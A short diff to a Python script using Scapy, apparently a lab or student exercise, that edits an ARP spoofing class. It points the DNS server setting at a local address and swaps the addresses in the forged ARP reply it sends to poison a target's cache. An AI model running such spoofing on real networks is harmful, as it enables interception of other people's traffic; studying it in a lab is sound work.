@@ -7,7 +7,7 @@ import time
 
 DOOFENSHMIRTZ_IP = "10.0.2.15"  # Enter the computer you attack's IP.
 SECRATERY_IP = "10.0.2.4"  # Enter the attacker's IP.
-NETWORK_DNS_SERVER_IP = "8.8.8.8"  # Enter the network's DNS server's IP.
+NETWORK_DNS_SERVER_IP = "10.0.2.43"  # Enter the network's DNS server's IP.
 SPOOF_SLEEP_TIME = 2
 
 IFACE = "enp0s3"  # Enter the network interface you work on.
@@ -67,8 +67,8 @@ class ArpSpoofer(object):
         # Get the MAC address of the target
         target_mac = self.get_target_mac()
 
-        arp_response = ARP(op=2, pdst=self.target_ip, hwdst=target_mac, psrc=self.spoof_ip)
-
+        # arp_response = ARP(op=2, pdst=self.target_ip, hwdst=target_mac, psrc=self.spoof_ip)
+        arp_response = ARP(op=2, pdst=self.spoof_ip, hwdst=target_mac, psrc=self.target_ip)
         scapy.send(arp_response, iface=IFACE, verbose=0)
         print(f"Sending spoof number {self.spoof_count}")
         self.spoof_count += 1
